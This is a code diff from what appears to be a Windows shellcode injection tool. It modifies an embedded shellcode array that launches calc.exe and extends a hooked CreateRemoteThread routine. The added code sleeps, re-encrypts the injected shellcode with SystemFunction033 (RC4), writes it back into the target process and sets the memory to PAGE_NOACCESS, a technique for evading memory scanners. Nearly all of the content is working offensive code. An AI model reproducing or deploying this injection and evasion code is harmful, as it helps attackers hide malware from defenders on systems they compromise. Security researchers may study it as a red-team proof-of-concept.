@@ -62,10 +62,11 @@ char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
 "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
 "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
-"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
+"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
 "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
 "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-"\xd5\x63\x61\x6c\x63\x00";
+"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+
 
 
 int getPidByProcName(const char* procname) {
@@ -90,7 +91,7 @@ HANDLE hookedCreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadA
     DWORD old;
 
     SIZE_T bytesRead = 0;
-    // Resolve SystemFunction033 address from advapi32.dll 
+    // Resolve SystemFunction033 address from advapi32.dll
     _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");
 
     // Arrives here encrypted and with PAGE_NOACCESS
@@ -125,6 +126,21 @@ HANDLE hookedCreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadA
     VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_EXECUTE, &old);
 
     CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
+
+    SleepImplant(9520);
+
+    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_READWRITE, &old);
+
+    SystemFunction033(&_data2, &key);
+
+    WriteProcessMemory(hProcess, lpStartAddress, &shellcode, sizeof(shellcode), &bytesRead);
+
+    printf("Shellcode Encrypted written in the Address = %p\n", lpStartAddress);
+    getchar();
+
+    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_NOACCESS, &old);
+    printf("Permisions changed to PAGE_NOACCESS\n");
+    getchar();
 
     VirtualProtect(&CreateRemoteThread, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
     return NULL;
